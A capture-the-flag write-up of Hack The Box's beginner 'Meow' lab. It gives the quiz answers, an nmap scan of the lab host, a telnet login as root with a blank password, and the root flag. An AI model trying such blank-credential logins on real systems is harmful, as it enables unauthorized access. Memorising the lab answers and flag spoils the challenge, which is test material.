---
title: "[HTB] Meow"
author: "Wook Lee"
date: "2024-06-17"
tags: ["Hack The Box"]
---

> My journey begins here. 🐌

---

##### TASK 1

What does the acronym VM stand for? </br>

```
Virtual Machine
```

</br>
 
##### TASK 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

```
Terminal
```

</br>

##### TASK 3

What service do we use to form our VPN connection into HTB labs?

```
openvpn
```

</br>

##### TASK 4

What tool do we use to test our connection to the target with an ICMP echo request?

```
ping
```

</br>

##### TASK 5

What is the name of the most common tool for finding open ports on a target?

```
nmap
```

</br>

##### TASK 6

What service do we identify on port23/tcp during our scans?

```
telnet
```

```zsh
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-psvucohdrg]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.67.74 -p 23
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-17 05:20 BST
Nmap scan report for 10.129.67.74
Host is up (0.0098s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-psvucohdrg]─[~]
└──╼ [★]$
```

</br>

##### TASK 7

What username is able to log into target over telnet with a blank password?

```
root
```

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.27]─[leewookb@htb-psvucohdrg]─[~]
└──╼ [★]$ telnet 10.129.67.74
Trying 10.129.67.74...
Connected to 10.129.67.74.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 17 Jun 2024 04:26:46 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.67.74
  IPv6 address for eth0: dead:beef::250:56ff:feb0:4ed1

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
```

</br>

##### SUBMIT FLAG

Submit root flag

```
b40abdfe23665f766f9c61ecba8a4c19
```

```shell
root@Meow:~# ls
flag.txt snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~#
```

![meow_clear](./htb_meow.png)
